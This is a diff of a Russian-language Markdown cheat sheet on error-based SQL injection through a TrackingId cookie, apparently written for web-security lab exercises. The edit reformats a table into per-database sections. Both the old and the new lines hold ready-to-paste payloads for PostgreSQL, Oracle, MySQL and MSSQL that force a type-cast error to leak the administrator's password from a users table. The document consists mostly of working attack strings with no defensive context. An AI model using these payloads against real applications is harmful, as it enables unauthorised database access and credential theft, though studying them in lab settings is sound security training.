@@ -245,13 +245,17 @@ TrackingId=xyz'||(SELECT password FROM users WHERE username='administrator')::in
 
 ### 🎯 Получить пароль за 1 запрос (если ошибки показывают данные)
 
-| СУБД | Трафарет (вставлять после `TrackingId=`) |
-| :--- | :--- |
-| **PostgreSQL** | `<code>'||(SELECT password FROM users LIMIT 1)::int||'</code>` |
-| **Oracle** | `<code>'||(SELECT CAST(password AS int) FROM users WHERE ROWNUM=1 AND username='administrator')||'</code>` |
-| **MySQL** | `<code>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</code>` |
-| **MSSQL** | `<code>' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--</code>` |
+### PostgreSQL
+`'||(SELECT password FROM users LIMIT 1)::int||'`
 
+### Oracle
+`'||(SELECT CAST(password AS int) FROM users WHERE ROWNUM=1 AND username='administrator')||'`
+
+### MySQL
+`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
+
+### MSSQL
+`' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--`
 ---
 
 ### 🔍 Проверить символ по позиции (если ошибки только меняют статус)
